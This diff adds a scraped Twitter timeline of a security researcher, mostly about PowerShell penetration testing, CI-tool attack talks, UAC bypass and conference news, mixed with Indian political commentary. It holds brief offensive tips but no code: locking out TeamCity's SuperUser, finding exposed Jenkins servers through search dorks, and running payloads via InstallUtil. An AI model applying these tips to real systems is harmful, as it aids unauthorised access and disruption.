@@ -1,0 +1,833 @@
+nikhil_mitt
+http://pbs.twimg.com/profile_images/1435504202/Nikhil_Mittal_400x400.JPG
+RT @SecurityTube: #Powershell for Pentesters by @nikhil_mitt: https://t.co/AQrNjp2ki1 PROMO pricing ends shortly! https://t.co/2oBGJ3WsgR
+RT @OxbloodRuffin: Crikey. I'm getting gang-spammed with infected documents via every Tibetan supporter I know.
+@jczucco Thanks! There are some updates to the slides. I will release updated ones after my #DeepSec talk.
+@Lee_Holmes Cool post!
+RT @euroinfosec: Expert: Security Problems Plague Integration Tools
+https://t.co/1DfnStvysU @nikhil_mitt at @BlackHatEvents Europe https://…
+@jharris473 Totally! The course was designed specifically for those who are new to PowerShell. @SecurityTube
+:) 
+https://t.co/bzGuOfn7Y2
+@secure_sean Its a shame that I missed yours!
+@secure_sean Oh yes! Soon!
+@secure_sean Thank you very much!
+RT @haroonmeer: The slides from my #BHEU talk are now online:
+
+https://t.co/EWquoUWtpr
+RT @euroinfosec: Many integration tools ship with no default authentication, warns @nikhil_mitt at @BlackHatEvents Europe https://t.co/A1XX…
+RT @xme: Live demo against #Jenkins by @nikhil_mitt:
+- RCE ✓
+- Decrypt credentials ✓
+#BHEU
+RT @fb1h2s: Halloween team at blackhateu @riyazwalikar @nikhil_mitt https://t.co/uQbbTIxpZ8
+RT @NETpeas: @nikhil_mitt demo the great Nishang tool #blackhat version #BHEU https://t.co/eWhF5gExHV
+@YashinMehaboobe Yes! :)
+@fb1h2s You not in Amsterdam yet?
+@fb1h2s Sure! @therealsaumil
+@Sec_GroundZero Landed couple of hours back. Will ping you :)
+RT @subTee: Trivial Application Whitelisting Bypass 
+Even if File Hash is Banned
+Regsvcs/Regasm
+https://t.co/LDfL9fbWB6
+tl;dr https://t.co/…
+RT @attrc: Even if you can’t code there are  still many ways you can help open source projects. Testing, bug reports, creating test cases..…
+@haroonmeer None for own and laterally move. Persisting was a problem in 4 or 5.
+RT @ScriptingGuys: Improve Your Writing for Blogs and Technical Articles: Summary: The Scripting Editor, Dia Reeves, offers tips ... https:…
+RT @Enno_Insinuator: Interesting tool: PowerMemory
+code: https://t.co/syzH9UcY9m
+slides: https://t.co/EXOoyicoqu [PPT]
+#PowerShell https://…
+Correction! There is no fix for Jenkins yet. Only workaround.
+https://t.co/9LNiQlbHYm
+Created a working exploit for Jenkins (fix is out). Testing other #CITools for my preso at #BHEU and #DeepSec :) :P
+Holy fuck! Can't believe I missed this! #RCE 
+https://t.co/pl1UdaCaXd
+@StegoPax Thanks! Glad that you liked it. @SecurityTube
+@StegoPax Haha! @SecurityTube
+RT @acorn: Why a cess to finance Swacch Bharat is a bad idea. https://t.co/prjAOZiJLg (wrote this in March when they were toying with the i…
+RT @hFireF0X: @hFireF0X *system32\inetsrv folder
+@hFireF0X cc @subTee
+RT @hFireF0X: Windows10 TH2 10586, nice. Directory system32\inetmgr is empty while AppInfo whitelists ms signed InetMgr.exe inside it. You …
+It is better to be a Cow than a Muslim or a Dalit in India. When will we speak up? #SpeakUpIndia
+https://t.co/8g6j0lDw49
+Why I believe in no disclosure.
+https://t.co/LT4RG48Mev
+RT @ChrisJohnRiley: THIS is why you can't have nice things... https://t.co/KQ1Iak8vCK
+@anantshri Thanks Anant :)
+RT @ivanristic: I am hiring a software engineer in Pune, India, to work on SSL Labs with me. Interesting job with lots of variety!  https:/…
+My fav #Nishang script for the upcoming #BHEU Arsenal. MJPEG and PowerShell to live stream a target's Desktop :D https://t.co/N2Oa2g0nPw
+RT @StegoPax: Just realised @nikhil_mitt created both Nishang &amp; Kautilya how impressive is that!
+
+https://t.co/M7Du8YobHi
+@StegoPax :D Let me know if you need any help.
+@StegoPax Glad that you liked them :)
+RT @haroonmeer: Stripping the encryption between SQL Server and a client using Python (and Twisted) by @azhrdesai 
+
+https://t.co/KL1F9pxza1
+PowerShell for Penetration Testers comes to BlackHat! Join me for 2 days of fun &amp; hands-on. #PowerShell #BHAsia
+https://t.co/qqkBgLG1BL
+@IISResetMe :)
+@IISResetMe Newcomers will learn both Powershell and Pentesting. PowerShell experts will enjoy the Pentesting part. @SecurityTube
+@ppolstra Thanks Phil :)
+RT @Sec_GroundZero: My @BlackHatEvents schedule looks like chasing @nikhil_mitt from room to room
+@Sec_GroundZero Hahaha. @BlackHatEvents
+RT @SecurityTube: Excited to partner with @nikhil_mitt to launch Powershell for Pentesters:  https://t.co/AQrNjp2ki1  ! PROMO Offer! https:…
+RT @BlackHatEvents: A look at Continuous Integration (CI) tools from an attacker's perspective - #BHEU Briefing w/ demos by @nikhil_mitt ht…
+RT @XSSniper: As seen in a medical device update utility! #YesWeCan cc:@bobthebuilder @scotterven @charley_koontz https://t.co/4cVJz4dcSP
+RT @atwolf: LOL https://t.co/CIHcUVDERX
+RT @subTee: DynamicWrapperX , Kicks Ass!
+Jscript =&gt; native win32 api calls, 
+Allows you create functions from shellcode.
+see - Метод Regist…
+RT @shellywalia: In the toughest interview I've taken till date, I asked my father what he went through during the 1984 Sikh riots https://…
+RT @tiwaryshailesh: To each his own. Amazing Tools.
+Black Hat Arsenal Europe 2015 Line-Up 
+I'm starting with #nishang How about you?
+--
+htt…
+RT @hacks4pancakes: There's a slight chance people will report a USB drive to security but people will plug a $20 MP3 player into anything.
+Join me for two days of PowerShell for Penetration Testers at @deepsec 
+#PowerShell #infosec 
+https://t.co/sxxrJn8bV6
+RT @BlackHatEvents: See how a variety of scripts can keep track of a Windows user w/ the Nishang framework - #BHEU Arsenal @nikhil_mitt htt…
+@OxbloodRuffin True!
+Imagine if someone "weaponizes" Herpes.
+https://t.co/mHAv4IkoXD
+RT @PranavDixit: Zuck at IIT Delhi in a nutshell. This is all you need to know. https://t.co/oiojXfOTbG
+RT @kunalmajumder: Mark Zuckerberg argues https://t.co/xfE63RpfsD is good for India. But, is it? @ShwetaSengar argues In memes :) https://t…
+RT @Lee_Holmes: Blogged - Compromising yourself with WinRM's AllowUnencrypted setting: https://t.co/OZlHx5Wcr0
+@msherman1970 I find cmdlets easier :)
+@msherman1970 The syntax is generally difficult to understand and explain to students and readers as compared to cmdlets.
+Hate it when I have to fall back to a Type accelerator. #PowerShell
+RT @garage4hackers: Pen Testing a SAP IT Infrastructure 
+https://t.co/10gukVUB2Z by @eberlywilson
+@flouSH You know my choice ;) Still, I prefer comfortable gaps between conferences. @WEareTROOPERS @Enno_Insinuator
+Taking into account the training dates, nullcon and Troopers clash with CanSecWest. -.-
+RT @BlackHatEvents: Kautilya enables using Human Interface Devices (HIDs) in pentesting. See the FREE #BHEU Arsenal demo w/ @nikhil_mitt ht…
+@MGrafnetter Ouch! @JakobHeidelberg
+@MGrafnetter Oh yes! I am stupid. Thanks :) @JakobHeidelberg
+RT @darrenpauli: Win 10 has 50 more services and 50 more drivers than Win 7 SP1, so bigger attack surface, says @tiraniddo #ruxcon https://…
+@JakobHeidelberg It is loaded. I think I am doing something wrong, but what? @MGrafnetter https://t.co/cQ3Qo4b4EJ
+@JakobHeidelberg Same goes for Get-bADPasswords.
+@JakobHeidelberg Hi Jakob, can't get Get-ADHashDump to work. Error says 'Get-ADReplAccount' not recognized. Problem with DSInternals?
+RT @JakobHeidelberg: New tool: Dump AD user password hashes on-the-fly to a file of chosen format (no need to export &amp; extract NTDS.DIT) ht…
+@gentilkiwi Are you getting my emails?
+Finally watched #Bahubali. What a treat!
+RT @ryanaraine: real talk  https://t.co/GN9IWxTDdI
+RT @BlackHatEvents: Android Tamer - A Virtual/Live Platform presented by @anantshri to assist w/ an array of Android security-related tasks…
+RT @hackerfantastic: Red team buzzword bingo! A translation game for 90's era h4x0rz when adapting to the modern theatre!(*note: humour.) h…
+RT @lindsaypereira: VK Singh's party only protects cows. Dogs, women and children are not its responsibility, so stop harassing him.
+@X0RC0NF Thanks! @riyazwalikar
+RT @pabraeken: @pabraeken Found and display every GPP password of domains in the forest https://t.co/fqvk6224I4
+@GregStaskowski Yikes! @passwordrandom
+@jameslyne LOL @passwordrandom
+On a totally unrelated note :P, my #CITools talk at #BHEU and #Deepsec will have at least 9 live demos :)
+Every time you don't give a live demo, God kills a kitten. #LiveDemo #DemoGods https://t.co/hLWz02uoxE
+Going by the standards of BJP, he will soon be promoted. #Shame
+https://t.co/Zmp46qonuZ
+RT @deepsec: Nikhil Mittal has two Black Hat Europe passes for his attendees: Nikhil Mittal offers two passes for Black Hat Eu... https://t…
+Shared my #ContinuousIntrusion preso with couple of developers of the tools. They asked very nicely. Lets see how it goes. #Deepsec #BHEU
+RT @netbiosX: Dumping ntds.dit files using #PowerShell https://t.co/VOuP6gvNI4
+Loading my #BHEU and #DeepSec slides with memes. Never used so many of them. Lets see how it goes :D
+@Ben0xA Congratulations, sir :)
+Hate it when conferences clash. More so when they are not the competing ones and are on different continents.
+RT @proxia: RT Continuous Integration increases the attack surface of the enterprise @BlackHatEvents http://t.co/7rbLOQFsD0  @nikhil_mitt
+RT @midnite_runr: Powershell Open-SSH login via NTLM?? :D
+https://t.co/pBOy16NwRH
+RT @washalsec: #Webappsec  #security practice app by  @s4n7h0 &amp; @samanL33T  https://t.co/2dnIjtLo8u
+RT @dawidczagan: My training at @deepsec in Vienna - wanna play with award-winning web app hacks in Google,Yahoo,Mozilla,Twitter...? 
+http:…
+@X0RC0NF Cool, thanks! @riyazwalikar
+@X0RC0NF Will the slides be available?   @riyazwalikar
+@J4vv4D LOL xD
+Whats up with so many conferences in the US not paying for speaker travel? No international speakers required? #infosec #cfp
+RT @ArvindKejriwal: कुछ लोगों को इससे तकलीफ है कि दुसरे क्या खाते हैं। उन्हें इस बात की चिंता नहीं कि इस देश मैं कई लोगो को कुछ नहीं खाने …
+@Sh4d0wS4int Great!
+RT @scriptjunkie1: Protip: If you don't want to be identified, don't let reporters post long quotes of yours.
+https://t.co/Yl4wVm5seD
+RT @l33tdawg: So Bank of America called the office and want @embyte to remove their name from his slides (page 43) http://t.co/rov3skw6XZ #…
+@Sh4d0wS4int No.
+@Sh4d0wS4int Could be just the firewall :)
+@Sh4d0wS4int Sorry, no links for setup. I just booted up a Server 2012 VM and used it.
+@Sh4d0wS4int Are you sure that WMI is enabled on the Server and you are using correct creds?
+@Sh4d0wS4int I used a Windows 7 machine as the attack machine and a Server 2012 VM as target. No special setup required.
+So many people still use #CruiseControl -.- 
+It is like using IIS5 or even worse.
+RT @SecurityTube: New Course Launch: Linux Forensics by @ppolstra - 12+ hrs HD vidoes! PROMO pricing: http://t.co/qITKWwKEav http://t.co/2P…
+RT @notsosecure: New #NotSoSecure blog
+ICMP Tunnels - A case study!
+https://t.co/Ol5JT9H29z
+@notsosecure Very interesting post. Thanks! BTW you can use some PowerShell in such situations *wink* *hint* :)
+RT @PyroTek3: "The Most Common #ActiveDirectory Security Issues and What You Can Do to Fix Them": https://t.co/n2GjzS9Rw3
+#infosec #Enterpr…
+RT @subTee: Example :
+Download And Execute msf reverse_http payload
+via InstalUtil.exe of course...
+https://t.co/CNJ9PCOFht
+@kevin_robertson And were you able to get access?
+One with 73 Build executors! It literally means anyone who know how to use Google can execute commands on 73 machines in that network. #WTF
+Ok I have seen it all now. Publicly exposed #Jenkins servers with no security configured, running as root.
+@Ashishdp :D
+I am giving away two #BHEU briefings passes.
+http://t.co/tDp3TcGos0
+RT @hFireF0X: Basically the only left working method is x64 mmc.exe dll hijack abuse. And all ITW autoelev. impl. in malware NOT work with …
+RT @hFireF0X: Windows 10 TH2 build 10565 got Sysprep hardening against UACMe :) http://t.co/TtcfrzKlIL
+It would be even better if the Build Executor on master is not installed by default.  #Jenkins
+@MilanGabor Oh yes! The joy of figuring it out :) :D
+That day when you spend hours to test things to justify a single line to be written in a presentation slide.
+"....we are planning to change the Jenkins setup in a future release to be secure by default...." Finally! #Jenkins
+https://t.co/4UgpLEavNB
+Read above with the fact that #Jenkins do not enforce password complexity and any type of brute force protection.
+@anantshri Just testing some Google dorks. Not doing internet wide scans. Will try Shodan later.
+So many #Jenkins instances exposed to the internet with "Logged in Users can do anything" -.-
+RT @makash: Exciting opportunity to play with, demo &amp; train on some of the most popular security tools. This is a client facing role. DM me…
+Make this a sticky note. Specially if you are a sysadmin or do Blue Teaming. #PowerShell
+https://t.co/DsjhKi7lhf
+RT @jsnover: The reason why PowerShell has a -ExecutionPolicy BYPASS parameter is to make it absolutely clear that it isn't a security laye…
+RT @BlackHatEvents: Track Windows users with #BHEU Arsenal tool “Nishang” by @nikhil_mitt for live-streaming of logging keys &amp; more http://…
+RT @Enno_Insinuator: I rly like #PowerShell 4 #IPv6 w/ Windows.
+@ehorley's cool ref.: http://t.co/A0GA1CUoi0
+MS' https://t.co/LMuFK8HatA ht…
+@spav5 I am going to present about it and other CI tools in Nov. I can share with you my preso prior to that, if you can share an email id.
+@kjacobsen Yes! Project Dev Privileges. I tried so much to get command execution with those privs but no success.
+RT @kjacobsen: @nikhil_mitt not to mention walk up registration is enabled by default.
+Only few more seats remain for my training "PowerShell for Penetration Testers" at @deepsec #DeepSec #Infosec
+https://t.co/sxxrJn8bV6
+I am running a #BHEU Briefings pass contest for giving away two passes. #Blackhat
+http://t.co/tDp3TcGos0
+And this makes it trivial to keep SuperUser out of #TeamCity by continuously brute forcing the token.
+Fun Fact: You can lock out SuperUser in #TeamCity for 1 minute by pressing the login button five times without filling user/pass.
+@WEareTROOPERS Yes! Will submit a talk as well.
+RT @Enno_Insinuator: DSCompromised: PowerShell [] 4 managing &amp; infecting [] via Windows Desired State Configuration (DSC)
+https://t.co/w57L…
+RT @netbiosX: #PowerShell Command Line Logging https://t.co/2BT42jO2nH
+Submit a talk to @WEareTROOPERS. One of the best infosec/hacker conferences out there. 
+https://t.co/gK3YbDZswK
+RT @WEareTROOPERS: It's official: CfP for #TR16 is "open": https://t.co/8CjVJ41stn.
+1st round till Nov 30, 2nd until Dec 20. Looking fwd to…
+Ah! There is a plugin for that. Nice! #Jenkins #CITools
+https://t.co/IevC61lfN9
+Saw a #Jenkins implementation with Google authentication today. More of it please. #CITools
+RT @kiranshaw: Have Sacked Minister For Corruption, Announces Arvind Kejriwal on TV - a great example of walking the talk  http://t.co/o3q3…
+RT @Enno_Insinuator: Extracting Password Hashes from Large NTDS.DIT Files
+https://t.co/N68I7NvWyy
+RT @htTweets: #BeefBan votary Sangeet Som is director of meat processing unit http://t.co/bIMhip333S http://t.co/MBiIa7JkEQ
+RT @subTee: So I turned InstallUtil.exe into a Keylogger/Mouse Click Recording Tool
+https://t.co/XRGBk8NJbh
+Had to be done. http://t.co/gkp…
+RT @BlackHatEvents: Generate ready-to-use payloads for HIDs (Human Interface Devices) w/ @nikhil_mitt's Kautilya -- #BHEU Arsenal http://t.…
+RT @kennwhite: Just checked, and for the record, there are &gt;2 million MySQL database servers with exposed direct interfaces on the Internet.
+RT @wallofsheep: New batch of Speaker Workshops presentation slides from @_defcon_ 23 posted. http://t.co/voNnjxrpKM #defcon
+@mattifestation Whoa! Congrats dude! Veris arguably has best PowerShell security talent now. @FireEye @verisgroup
+RT @MiltonSecurity: #HackInTheBox talk cancelled due to legal pressure from #IPCamera manufacturers. http://t.co/lMKJDX3dEf http://t.co/4N6…
+RT @Heinzarelli: New Blog Post - Monitoring and Alerting on PowerShell Command Line Activity: https://t.co/Vs7cCFQQ9T http://t.co/eXeC8eR9Kd
+I like how Google cloud provides SSH access to *nix machines directly from browser.
+RT @therealsaumil: Slides from my keynote @IntuitIN's #Hacktober2015 event
+
+2016: The Infosec Crossroads
+
+http://t.co/ucgVFWD4bh
+RT @p3t3_r3c0n: yeah http://t.co/oUPoR2u0hf https://t.co/kGEuRPbsR1
+That OWA hack is quite smart. Don't think many Red Teams/Pen Testers do something like that regularly.
+The contest for @BlackHatEvents briefings pass is still on. I am giving away two briefings pass. #BHEU #infosec
+http://t.co/tDp3TcGos0
+RT @hFireF0X: Windows 10 TH2 build 10558 confirm that OOBE has been redesigned earlier in 1055x builds and UAC bypass used by WinNT/Pitou i…
+RT @pabraeken: #security #privacy #UpdateusUser Hi @nvidia #powermemory reveal #nvidia hidden account http://t.co/FbXXcgqERM
+RT @subTee: Got PowerShell Path Restrictions? 
+Check out some of the scripts here:
+'C:\Windows\diagnostics\system\AERO'
+Like, say,  CL_Load…
+RT @makash: Kotak mahindra bank. The report isn't clear if they have complained against the supplier. DZ Card India Pvt Ltd http://t.co/5YI…
+RT @RGKelley5: Harness 1.0 usage guide
+http://t.co/8itsgwSK1T 
+#PowerShell #DefCon23
+RT @WEareTROOPERS: What could possibly go wrong... https://t.co/KYai9uXYRa
+RT @BlackHatEvents: .@anantshri’a Android Tamer is a virtual/live platform that reduces the need for environment configs #BHEU Arsenal http…
+RT @BDUTT: Cry for a country where the life of a man is less valued than the life of a cow/buffalo/chicken/pig/goat. #DadriLynchMob on @WeT…
+RT @R00tkitSMM: http://t.co/MqaNwR3gLA windows unknown privilege escalation
+found it Independently it was fixed dont know related CVE @hFir…
+RT @MANJULtoons: Christian group 'hurt', demands ban on the play #AgnesOfGod. My #cartoon http://t.co/ijk782FwVY
+@gentilkiwi Could you please follow me for DM?
+@JakobHeidelberg Interesting! Thanks for sharing.
+RT @JakobHeidelberg: Crack and detect weak passwords in Active Directory on-the-fly http://t.co/m30BCeORE5 #Passwords #ActiveDirectory #DSI…
+@chris_arceneaux I already released it :)
+https://t.co/Uk17J1EP5W
+RT @garage4hackers: Q&amp;A Portal for the curious information security professionals.  
+http://t.co/L9TrbT5pAW http://t.co/wfz3j12J4J
+RT @WEareTROOPERS: And here's the full list of #TR15 videos:
+https://t.co/oHDN7ak0HH https://t.co/n8PwU4hMzy
+Shit hits the fan?
+https://t.co/fievNqg21V
+Also, https://t.co/UQNtakJvuW
+RT @Insinuator: New blog post: VMware did it again: vCenter Remote Code Execution http://t.co/lf28A0RpXq
+@obscuresec We are still a small community dude. I just want to share things I find useful. Even if it is not high quality.
+@obscuresec Thanks for that! I am going to look for them right now.
+@GH0S1 Yes it is :)
+@obscuresec I mentioned "publicly known". Anyway, you sound agitated. I just shared something I found useful. Chill ! @harmj0y
+@obscuresec Really? I missed them. Any link where I can read about them? @harmj0y
+@obscuresec Isn't that the only publicly known way of bypassing UAC? @harmj0y
+@obscuresec Raises the bar? No it doesn't. But I was unable to come up with a way to not write the DLLs to disk :/ @harmj0y
+@pabraeken This one. Checked on Windows 7 and 8.1 @subTee http://t.co/JC2WOLY2ng
+@pabraeken Yes. I tried it before writing my article as well. @subTee
+[Blog] Blackhat Europe briefings pass contest. I am giving away 2 #BHEU passes! Please RT!
+http://t.co/tDp3TcGos0
+@BrandonLive Sounds interesting! Let me see if I can find something useful.
+I have 2 #BHEU passes to give away. One each for top contributors to #Kautilya &amp; #Nishang. You can start submitting PRs. Details soon :) :P
+@BrandonLive Low to Medium/High would be awesome! Don't think there is a hack to do that. May require memory corruption bug(s).
+@pabraeken I tried it. But I still got a prompt? @subTee
+@p_matula Didn't get you. Isn't UAC enabled by default? @_FireFart_
+@ToreGroneng Tested on v3. Logs should show PS commands from Windows Temp directory. Don't know if copying DLLs will be logged anywhere.
+@hFireF0X Hope that is fine with you? @R00tkitSMM
+@hFireF0X I didn't ask! But I credited you for your great work. Thanks for UACME. @R00tkitSMM
+[Blog] Bypassing UAC with PowerShell. #infosec #PowerShell
+http://t.co/NI2vpMTLu5
+A wild tigress and leopards spotted 7-8 kms from my place :D :) #Bhopal
+@imessage357_H Yes, today. @Cn33yX7
+RT @subTee: 'Domain Admin' Enumeration via #JavaScript - POC/HTA file
+https://t.co/csM8TbJchX
+
+Lots more queries examples here:
+http://t.co…
+@hannibals Thanks dude!
+@Ashishdp Hahaha
+RT @violentlydave: Wow.  Even this redneck in Florida knows how stupid this move is, government of India. https://t.co/mFfDjs8k0A
+@BenderBieger Thanks! Mostly ported this code.
+https://t.co/OwZN0mvfHT
+Woohoo! Successfully tested methods to Bypass UAC using #PowerShell 
+Code and blog post soon. http://t.co/lJIKGpb1iT
+Great! I will show off #Nishang and #Kautilya at #BHEU in November. 
+https://t.co/2UWMgDzpX4
+RT @ToolsWatch: The Blackhat Arsenal EU 2015 Online. Check the great line-up &gt;&gt; https://t.co/nwg8srnwh0 #BHEU
+Offered without comment.
+https://t.co/HQlUzwI6Ca
+RT @deepsec: #DeepSec 2015 Workshop: #PowerShell for Penetration Testers … http://t.co/zj8rMtFrYV #PenTest #InfoSec #fb
+@Ashishdp The PIB link quoted in the above tweet doesn't exist! @BJPLucknowBJP @PIB_India 
+http://t.co/dicjgMg6yW
+Inspired by #AnkitFadia?
+https://t.co/1gvLaVV7N8
+@Ashishdp Sorry farzi nikla. 
+https://t.co/H8eCrQ23mK
+@Ashishdp Clarification comes *phew* @gkjohn
+RT @subTee: Behind Enemy Lines:
+Active Directory Recon/Enumeration in JavaScript :)
+https://t.co/WbMowfYELP
+More later.
+This one lists DC's…
+O.O *jumps off roof*
+https://t.co/5YYs3BFWBO
+RT @subTee: Reverse HTTP PowerShell. Without running PowerShell. :)
+https://t.co/3F1YVKLlHC
+POC PoshRat HTTP Client http://t.co/XfmjCvSnBY
+@kaithomsen Sounds tiring :D @mikko @pixelache
+RT @kaithomsen: @nikhil_mitt @mikko @pixelache At least you have to go to the dead drop to get infected. #cybermeaslesparty
+USB dead drop. What could go wrong? #Facepalm
+https://t.co/6mZaPY5f8j
+RT @scriptjunkie1: Honest Q for powershellers. Why PoshSec, Kansa, Invoke-IR, PowerSploit, Nishang, *and* Empire? Too many chiefs? Everyone…
+RT @ArvindKejriwal: A must read : https://t.co/8onzOD7RDb
+RT @PyroTek3: Slides from my @DerbyCon Red vs Blue Modern Active Directory Attacks &amp; Defense talk posted! https://t.co/QP2SJVtyWf
+#mimkatz …
+@scriptjunkie1 I could not follow the coding standards of PowerSploit. @obscuresec and I discussed this couple of years back at Defcon.
+RT @igursev: Join me for lightning training on security testing for JMS enterprise messaging applications @appsecusa @owasp 1130 am today
+RT @RGKelley5: Harness 1.0 released. Includes SSL, sleep, bug fixes, and more. https://t.co/ibof8f4dYm
+Now to catch a flight to #derbycon :…
+"....until IT released a GPO update blocking powershell remoting..." And switched back to WMI? Poor strategy by IT.
+http://t.co/ZkB1sWitFj
+RT @jseidl: Meet the Babadook: "Connection-less #Powershell Persistent and Resilient #Backdoor" or "How to piss off coworkers" http://t.co/…
+@obscuresec @mattifestation Aha! Going to steal some of it :P
+RT @dawidczagan: Join my training at @deepsec and play with award-winning web app hacks in Google,Yahoo,Mozilla,...(early bird offer)
+https…
+RT @subTee: PowerShell ISE does not seem to run in ConstrainedMode.  Even with Device Guard and Virtualization Based Security? http://t.co/…
+@PyroTek3 Yikes!
+RT @PyroTek3: Use Kerberos Authentication on a Citrix NetScaler? 
+Change service acct pw: "freebsd!@#456"
+http://t.co/ZNsQfoH2Si http://t.c…
+@sajal_thomas Of Course!
+@sajal_thomas Thanks! Talked to the guys. Space could be a spoiler. Still, hoping to train at null.
+@sajal_thomas Not yet. Trying to get to Nullcon for the first time. Lets see if they like it.
+If you are coming to #DeepSec check out my training PowerShell for Penetration Testers. Please RT! #infosec
+https://t.co/sxxrJn8bV6
+That is how the Babus roll. Make it so vague that it could be applied to anyone/anything they wish. Just like 66A.
+https://t.co/7yXqjLpZ46
+RT @BlackHatEvents: .@nikhil_mitt demonstrates how CI tools provide an excellent attack surface due to poor security controls at BHEU http:…
+Apparently trended by AAP supporters. Still, happy that more and more people are outraging about it. #ModiDontReadMyWhatsapp
+Wow! A Twitter trend in India against India's proposed Encryption Policy!!! *wipes off tears* #ModiDontReadMyWhatsapp
+#daftnationalencryptionpolicy
+https://t.co/wjb2gEgjnn
+RT @chinmayiarun: Facebook launches face recognition tool in India http://t.co/DTQxQ7dDlf Banned in Europe but okay here because we don't c…
+RT @JakobHeidelberg: My @SEC_T_org slides on Active Directory persistence: http://t.co/sY0XGN3Nt2 BIG thanx to @PyroTek3 for inspiration! h…
+@JakobHeidelberg Thanks! Never knew Powerpoint could be used for such good slides. Guess its time for me to rework my upcoming presos.
+@JakobHeidelberg Great content and terrific slides design. What did you use to make those slides?
+@__bkm_ That would be a terrible terrible terrible idea. @makash
+RT @VishalDadlani: #AajTakChor , die of shame! You are paid political tools who lie to the people! I hope the people pay you back, HARD! ht…
+RT @pierrefitter: Remember the secret deals between the NSA &amp; web services that enraged all of us? 
+
+India wants to make them law. https://…
+@makash Assuming that there would actually be something like a Smart City.
+@makash Most probably done by a vendor, one of the "Big 4s". That is how they roll :) @pranesh_prakash
+RT @pranesh_prakash: All security ppl should write in by Oct 16! Indian govt clamps down on all secure &amp; private comms in draft regs. http:…
+RT @OxbloodRuffin: Delhi boys do India proud; watch them catch woman's attacker, hand him to police http://t.co/yvFTq88Yto Excellent!
+@byt3bl33d3r Haha.
+@byt3bl33d3r If you are writing Python. Below cld be useful. And if in PowerShell, I am going to steal your code :)
+https://t.co/dIutJu1wGn
+@loneferret What "National Security" is to countries is "Religious Reasons" for individuals ;) :D
+@byt3bl33d3r NTP and OCSP.
+@loneferret Ridiculous! Never heard of any such Hindu belief. IMO, she is just being a jerk.
+RT @subTee: DeviceGuard/UMCI. Its fantastic to see that all My InstallUtil.exe attempts are blocked. Well Done! Time to adapt :) http://t.c…
+Reading and enjoying every bit of http://t.co/N6qv79L8ia. Thanks @PyroTek3
+RT @Chellaney: Shameful: India allows Saudi diplomat facing charges of raping two Nepalese maids to fly home with no sign that he would be …
+@Aagan86 Conspiracy theorist inside me has already said "bye bye" to #NetNeutrality since the visit was announced. @sunil_abraham
+RT @Aagan86: Has anyone noticed that http://t.co/NWlO1ihcMN ads have increased ever since Zuckerberg announced PM visit to FB HQ? #NetNeutr…
+RT @michaelossmann: Ahmed can have a job at Great Scott Gadgets if he wants. Colorado is quite popular with refugees from Texas.
+RT @subTee: Introducing #NextGen Attack Example :)
+Download, Compile, Execute #mimikatz Inside Process Space for InstallUtil
+https://t.co/W…
+Politician visits a hospital to meet patients. Stood on one of the patients for photo [Hindi] #NotFakingNews #WTF
+https://t.co/QeAarDLFiJ
+@ketanpkr Sure. Will send you part of my paper/preso related to your tool. Will try to raise issues as well.
+@ketanpkr But I can share details about my talk with them before I present about it.
+@ketanpkr Which vulnerability? It is from the tool's documents. I never claimed there is any vulnerability :)
+@subTee Looks great! Ever thought of PRs to Nishang?
+@prakharprasad ;)
+And of course it will take you less than a minute to find out the tool I am talking about :P
+Above from manual of a CI Tool. Catch my talk at BH Europe and DeepSec :)
+"With no security...of course no authorization either. Once you have config security, the default is that any user can perform anything."
+"[Redacted] was built from the bottom up with security in mind.....By default, [Redacted] does not require users to authenticate."
+RT @ITSecurityguard: @nikhil_mitt spent 4 hours debugging my IPv6 Script without realizing i have no v6 address
+@ITSecurityguard Hahahaha. Great minds...
+Ok. Literally spent two days testing a script only to discover that the problem was with my lab domain's proxy. #Facepalm
+RT @makash: Tata Sky stores passwords in clear text, has an upper limit of 8 characters and subscriber IDs are sequential. Their devs need …
+Shame on you Mr. Modi.
+"cremation ground out of bounds due to rally, Kargil war vet forced to cremate son in Mohali"
+http://t.co/wfVstdk9Me
+RT @garage4hackers: Started webcast @samykamkar Will be live for #Car #Hack Talk. 
+Live Link: https://t.co/GQiZ8lFGCl …Vroooooom
+Join me for two days of PowerShell for Penetration Testers at @deepsec. Limited seats. #InfoSec #pentest
+https://t.co/sxxrJn8bV6
+RT @garage4hackers: Buy Cold-drinks, beer, Snacks what you required, so you don't to miss @samykamkar's webcast today. Today 10:30 PM, Lets…
+RT @kaithomsen: Lousy behavior re responsible disclosure = no buy recommendation from us internal DFIR guys.
+RT @kaithomsen: We as customers and ultimately the teams responsible for the security of large corporations have to turn this up, obviously.
+RT @kaithomsen: It has been my policy for years to interview security vendors how their devices actually work. Just marketing blabla = no s…
+RT @kaithomsen: As long as security vendors keep selling magic boxes &amp; treat security researchers as in the currently @_fel1x and ERNW defe…
+@gdssecurity Wrong link. @F5Networks
+RT @davehull: And Kansa has a module, Get-Loki, that can push it to remote hosts, execute it, collect &amp; stack-rank the results. https://t.c…
+RT @hackerschoice: This is a git repository you want to clone and keep: https://t.co/XrQZaMqnFA
+RT @ryanaraine: C'mon FireEye, you're making me look bad http://t.co/19JaVO1dS7 &lt;-- legal threat against vuln research outfit
+RT @subTee: Hydrate #mimikatz From PNG
+https://t.co/J9QPYqaWIz
+http://t.co/LDfL9fbWB6
+Just One Way To Smuggle Executables Past Network Filt…
+RT @Enno_Insinuator: (1/2) For clarification: vulns of @_fel1x #playingwithfire talk @44CON - https://t.co/AT6Vdwfw2x - are NOT related 2 h…
+RT @haroonmeer: FireEye tried to use lawyers to silence @Enno_Insinuator &amp; @_fel1x who disclosed remote root bugs in their devices?
+
+#90'sV…
+RT @kennwhite: Windows RCE via “email, websites, &amp; IM. Once file is opened…no further interaction is req'd”
+http://t.co/vhPvkTtexh http://t…
+RT @HackingDave: We sponsor BSIDES all over the country including CLE, LV, and countless others. That just came to a screeching halt today.
+RT @BSidesLV: Official Statement from the #BSidesLV BoD, regarding our (former) videographer. http://t.co/CKJbqpm1b0
+RT @tonispbr: "Exploit" on Tweeted Times http://t.co/y8NKKT7ZyF - top stories by @nikhil_mitt, @BDeWyngaertJr, @rjmacfarlane
+RT @subTee: COM Surrogate Persistence. Then var o = new ActiveXObject("dllguest.Bypass"); in a . JS file that's it :) https://t.co/rIhPme2O…
+OMG! Om Shanti.
+https://t.co/LW63lA9Xo4
+RT @digininja: Anyone have FireEye kit on their network may want to have a look at this https://t.co/1iINa9nTAE
+RT @ITWebSec: Nice: Abusing Web Query (.iqy) files for effective phishing http://t.co/uHHeJDgEyo via @nikhil_mitt (HT @subTee)
+RT @ashokkmrsingh: #OROP for GOD sake if u dont want to give OROP it is fine but don't touch moral of serving soldiers. You have hit them n…
